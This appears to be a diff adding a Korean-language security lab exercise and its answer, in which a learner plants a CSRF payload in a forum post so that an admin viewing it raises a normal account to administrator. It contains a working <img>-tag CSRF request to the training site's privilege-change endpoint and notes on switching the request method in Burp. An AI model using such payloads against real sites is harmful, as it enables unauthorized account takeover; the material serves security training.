@@ -1,0 +1,11 @@
+CSRF 공격을 통하여 관리자 권한을 탈취하는 스크립트를 작성하고 게시글에 삽입 후 관리자 권한을 획득하시오.
+ (회원 가입 시 해당 계정의 관리자 계정도 함께 생성됩니다. 가입한 계정 뒤에 _examadmin을 붙여 관리자 계정으로 로그인할 수 있습니다.
+  일반 사용자 계정으로 로그인하여 게시글을 작성하고, 관리자 계정으로 로그인하여 작성한 글을 읽어 일반 사용자 계정을 관리자 계정으로 권한을 상승시키시오.)	
+
+1. 
+<img src="http://elms1.skinfosec.co.kr:8082/bbs11/updateGetAuth?loginId=jjhh%40naver.com&amp;adminYn=2">
+해당 글 작성하여 Burp의 [change request method] 기능을 이용하여  GET과 POST 전환
+
+<form method="POST" action="http://elms1.skinfosec.co.kr:8082/bbs11/updateGetAuth" ID="csrf-form"></form>
+
+                                                             	
